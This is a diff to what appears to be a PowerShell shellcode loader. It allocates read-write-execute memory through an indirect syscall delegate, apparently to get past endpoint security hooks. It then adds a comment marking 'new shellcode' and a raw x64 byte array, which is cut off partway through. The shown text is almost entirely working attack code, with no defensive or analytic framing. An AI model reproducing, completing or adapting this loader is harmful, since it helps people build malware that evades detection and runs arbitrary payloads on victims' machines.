@@ -71,7 +71,6 @@ $zeroBits = [IntPtr]::Zero
 $regionSize = [IntPtr]::new(4096)
 $allocationType = 0x1000 -bor 0x2000
 $protect = 0x40
-
 Write-Host "Attempting to allocate memory..."
 
 $indirectSyscall = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
@@ -91,9 +90,11 @@ $result = $indirectSyscall.Invoke(
 Write-Host "Allocation result: $result"
 Write-Host "Base Address: $baseAddress"
 
+# Check the result
 if ($result -eq 0) {
     Write-Host "Memory allocated successfully at address: $baseAddress"
 
+    # New shellcode
     $shellcode = [byte[]] @(
         0x48,0x83,0xEC,0x28,0x48,0x83,0xE4,0xF0,0x48,0x8D,0x15,0x66,0x00,0x00,0x00,
         0x48,0x8D,0x0D,0x52,0x00,0x00,0x00,0xE8,0x9E,0x00,0x00,0x00,0x4C,0x8B,0xF8,
